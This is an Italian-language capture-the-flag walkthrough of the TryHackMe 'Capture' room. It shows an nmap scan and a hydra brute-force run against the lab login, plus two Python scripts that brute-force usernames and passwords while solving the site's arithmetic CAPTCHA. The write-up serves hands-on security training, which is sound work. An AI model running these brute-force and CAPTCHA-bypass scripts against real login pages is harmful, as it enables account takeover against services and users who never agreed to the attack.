#tryhackmelabs #laboratorio 

https://tryhackme.com/room/capture

SecureSolaCoders ha nuovamente sviluppato un'applicazione web. Stanchi degli hacker che enumeravano e sfruttavano il loro precedente modulo di accesso, hanno ritenuto che un Web Application Firewall (WAF) fosse eccessivo e superfluo, quindi hanno sviluppato un proprio limitatore di velocità e ne hanno modificato leggermente il codice **.**

Suggerimenti
```
Esamina i messaggi di errore dell'applicazione quando tenti di accedere. Enumera per scoprire il nome utente (nome). Quindi enumera ancora una volta per scoprire la password.
```

```
nmap -Pn -O -v -p- 10.10.149.106
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```
andiamo su
```
http://10.10.149.106/login
```
facciamo qualche prova di login casuale

Ora catturiamo una richiesta e la relativa risposta con Burp Suite
```
POST /login HTTP/1.1
Host: 10.10.149.106
User-Agent: J
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: http://10.10.149.106
Connection: keep-alive
Referer: http://10.10.149.106/login
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin&password=123456
```

```
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.8.10
Date: Fri, 25 Jul 2025 05:47:40 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2043
Connection: close

<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
  font-family: Arial, Helvetica, sans-serif;
  background-color: black;
}

* {
  box-sizing: border-box;
}

/* Add padding to containers */
.container {
  padding: 16px;
  background-color: white;
}

/* Full-width input fields */
input[type=text], input[type=password] {
  width: 100%;
  padding: 15px;
  margin: 5px 0 22px 0;
  display: inline-block;
  border: none;
  background: #f1f1f1;
}

input[type=text]:focus, input[type=password]:focus {
  background-color: #ddd;
  outline: none;
}

/* Overwrite default styles of hr */
hr {
  border: 1px solid #f1f1f1;
  margin-bottom: 25px;
}

/* Set a style for the submit button */
.login_button {
  background-color: #4571d0;
  color: white;
  padding: 16px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
  opacity: 0.9;
}

.registerbtn:hover {
  opacity: 1;
}

/* Add a blue text color to links */
a {
  color: dodgerblue;
}

/* Set a grey background color and center the text of the "sign in" section */
.signin {
  background-color: #f1f1f1;
  text-align: center;
}

.footer {
   position: fixed;
   left: 0;
   bottom: 0;
   width: 100%;
   background-color: black;
   color: white;
   text-align: center;
}

</style>
</head>
<body>

<div class="container">
<form action="" method="POST">
    <h1>Intranet login</h1>
    <hr>
    <label for="usr"><b>Username</b></label>
    <input type="text" placeholder="Firstname" name="username" id="username" value="admin" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Password" name="password" id="password" value="123456" required>
    <hr>

    <button type="submit" class="login_button"><b>Log in</b></button>
  
</form>
    
    <p class="error"><strong>Error:</strong> The user &#39;admin&#39; does not exist
    
      </div>

<div class="footer">
  <p>Proudly hosted, maintained, and developed by <b>SecureSolaCoders.no ©</b></p>
</div>
</body>
</html>
```
proviamo un brute force utilizzando i files forniti dal laboratorio  usernames.txt passwords.txt
```
hydra -s 80 -L usernames.txt -P passwords.txt 10.10.149.106 http-post-form '/login:username=^USER^&password=^PASS^&from=&Submit=Sign+in:Invalid username or password' -f -o log_brute_force_.txt
```

```
└─# hydra -s 80 -L usernames.txt -P passwords.txt 10.10.149.106 http-post-form '/login:username=^USER^&password=^PASS^&from=&Submit=Sign+in:Invalid username or password' -f -o log_brute_force_.txt
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-25 01:58:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1375826 login tries (l:878/p:1567), ~85990 tries per task
[DATA] attacking http-post-form://10.10.149.106:80/login:username=^USER^&password=^PASS^&from=&Submit=Sign+in:Invalid username or password
[80][http-post-form] host: 10.10.149.106   login: rachel   password: football
[STATUS] attack finished for 10.10.149.106 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-25 01:58:58
```
Proviamo a loggarci ma...

login:
```
rachel
```
password:
```
football
```

```
## Too many bad login attempts!

**

### Captcha enabled

**  
769 - 12 = ?
```

Troppi tentativi di login e si è abilitato il Captcha!

se vogliamo tentare il brute force dobbiamo trovare il sistema di bypassare o risolvere il captcha

```
nano brutefc.py
```

```
#! /usr/bin/python  

from requests import Session  
import re  

url = "http://10.10.149.106/login"  

# Removing the line feed (\n) from the usernames and passwords read from the respective files  
usernames = open('usernames.txt','r').read().splitlines()  
passwords = open('passwords.txt', 'r').read().splitlines()  

def solve_captcha(response):  
    captcha_syntax = re.compile(r'(\s\s\d+\s[+*-/]\s\d+)\s\=\s\?')  
    captcha = captcha_syntax.findall(response)  
    return eval(' '.join(captcha))  

# Initializing a session  
session = Session()  
data = {'username': 'username', 'password': 'password'}  
# Create a post request to the url with the payload/data using the session opened  
response = session.post(url, data=data)  

for user in usernames:  
    data['username'] = user  
    response = session.post(url, data=data)  

    if 'Captcha enabled' in response.text:  
        captcha_result = solve_captcha(response.text)  
        data['captcha'] = captcha_result  
        response = session.post(url, data=data)  

        if 'does not exist' not in response.text:  
            print(f'Found username: {user}')  
            print(f"Attempting to brute forcing password for user: {user}")  

            for password in passwords:  
                data['password'] = password  
                data['captcha'] = captcha_result  
                response = session.post(url, data=data)  

                if 'Error' not in response.text:  
                    print(f'----> Found Username: {user} Password: {password}')  
                    exit()  
                else:  
                    print(f'[*] Trying password: {password} for user ')  
    else:  
        print(f'[*] Trying password: password for user: {user}')  

```

```
#! /bin/python3

import requests
import argparse

print(r"""
      
▄▄▄█████▓ ██░ ██  ███▄ ▄███▓    ▄████▄   ▄▄▄       ██▓███  ▄▄▄█████▓ █    ██  ██▀███  ▓█████ 
▓  ██▒ ▓▒▓██░ ██▒▓██▒▀█▀ ██▒   ▒██▀ ▀█  ▒████▄    ▓██░  ██▒▓  ██▒ ▓▒ ██  ▓██▒▓██ ▒ ██▒▓█   ▀ 
▒ ▓██░ ▒░▒██▀▀██░▓██    ▓██░   ▒▓█    ▄ ▒██  ▀█▄  ▓██░ ██▓▒▒ ▓██░ ▒░▓██  ▒██░▓██ ░▄█ ▒▒███   
░ ▓██▓ ░ ░▓█ ░██ ▒██    ▒██    ▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██▄█▓▒ ▒░ ▓██▓ ░ ▓▓█  ░██░▒██▀▀█▄  ▒▓█  ▄ 
  ▒██▒ ░ ░▓█▒░██▓▒██▒   ░██▒   ▒ ▓███▀ ░ ▓█   ▓██▒▒██▒ ░  ░  ▒██▒ ░ ▒▒█████▓ ░██▓ ▒██▒░▒████▒
  ▒ ░░    ▒ ░░▒░▒░ ▒░   ░  ░   ░ ░▒ ▒  ░ ▒▒   ▓▒█░▒▓▒░ ░  ░  ▒ ░░   ░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░░ ▒░ ░
    ░     ▒ ░▒░ ░░  ░      ░     ░  ▒     ▒   ▒▒ ░░▒ ░         ░    ░░▒░ ░ ░   ░▒ ░ ▒░ ░ ░  ░
  ░       ░  ░░ ░░      ░      ░          ░   ▒   ░░         ░       ░░░ ░ ░   ░░   ░    ░   
          ░  ░  ░       ░      ░ ░            ░  ░                     ░        ░        ░  ░
                               ░                                                             

      """)
print("\n****************************************************************")
print("\n* TryHackMe Room Link: https://tryhackme.com/room/capture      *")
print("\n* Twitter: https://twitter.com/sakibulalikhan                  *")
print("\n* Linkedin: https://www.linkedin.com/in/sakibulalikhan         *")
print("\n****************************************************************")
print("\n")

def solveCaptcha(captcha):
    if captcha[1] == '+':
        ans = int(captcha[0]) + int(captcha[2])
    elif captcha[1] == '-':
        ans = int(captcha[0]) - int(captcha[2])
    elif captcha[1] == '*':
        ans = int(captcha[0]) * int(captcha[2])
    elif captcha[1] == '/':
        ans = int(captcha[0]) / int(captcha[2])
    return ans

def crackUsername(url, captcha):
    print('[+] Starting username brute force...\n')
    f = open('./usernames.txt', 'r')
    for i in f:
        ans = solveCaptcha(captcha)
        myData = f'username={i.strip()}&password=letmein&captcha={ans}'
        sReq = requests.post(url, data=myData, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        sReq = sReq.text.split('\n')
        if 'does not exist' not in sReq[104]:
            print(f'!!! Username Found: {i.strip()}\n')
            crackPassword(i.strip(), captcha)
        else:
            captcha = sReq[96].split()

def crackPassword(uName, captcha):
    print('[+] Starting password brute force...\n')
    f = open('./passwords.txt', 'r')
    for i in f:
        ans = solveCaptcha(captcha)
        myData = f'username={uName}&password={i.strip()}&captcha={ans}'
        sReq = requests.post(url, data=myData, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if len(sReq.text) < 100:
            print(f'!!! Password Found: {i.strip()}\n')
            print(f'!!! Flag: {sReq.text.split()[1][4:-5]}')
            quit()
        else:
            sReq = sReq.text.split('\n')
            captcha = sReq[96].split()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Brute force username and password with captcha.')
    parser.add_argument('--host', '-t', type=str, help='Target host URL')
    args = parser.parse_args()

    if args.host:
        url = f'http://{args.host}/login'
        print(f'[+] Starting bruteforce with target URL: {url}\n')
        
        for i in range(0, 10):
            myData = 'username=admin&password=letmein'
            sReq = requests.post(url, data=myData, headers={'Content-Type': 'application/x-www-form-urlencoded'})
            sReq = sReq.text.split('\n')
            captcha = sReq[96].split()

        crackUsername(url, captcha)
    else:
        print("Error: You have to specify the target host using the --host or -t flag.")
        print("Usage: ./script.py --host $IP")
             
```

Per accelerare i tempi abbiamo trovato nel web uno script che fa per noi, sarebbe stato più istruttivo scriverlo ma è importante soffermarci a capire come funzioni.

Il codice è uno script Python progettato per eseguire un attacco di brute force su un sistema di login che utilizza un CAPTCHA. Ecco una sintesi delle sue funzionalità principali:

1. **Visualizzazione di Intestazione**: Stampa un'intestazione artistica e informazioni di contatto.
    
2. **Risoluzione del CAPTCHA**: La funzione `solveCaptcha` calcola il risultato di un'espressione matematica (CAPTCHA) fornita dal server.
    
3. **Brute Force degli Username**: La funzione `crackUsername` legge un elenco di username da un file e tenta di effettuare il login con una password predefinita ("letmein") e il risultato del CAPTCHA. Se trova un username valido, chiama la funzione `crackPassword`.
    
4. **Brute Force delle Password**: La funzione `crackPassword` legge un elenco di password da un file e tenta di effettuare il login utilizzando l'username trovato e il CAPTCHA. Se la password è corretta, stampa il flag ottenuto dalla risposta del server.
    
5. **Esecuzione dello Script**: Lo script accetta un argomento da riga di comando per specificare l'URL del target e inizia il processo di brute force.
    

In sintesi, lo script automatizza il processo di tentativo di accesso a un sistema protetto da CAPTCHA, cercando username e password da file di testo.
```
python3 brutefc.py --host 10.10.149.106
```

```
[+] Starting bruteforce with target URL: http://10.10.149.106/login

[+] Starting username brute force...

!!! Username Found: natalie

[+] Starting password brute force...

!!! Password Found: sk8board

!!! Flag: xxxxxxxx
```
abbiamo ottenuto così le credenziali e la flag
```
xxxxxxxxxxxx
```


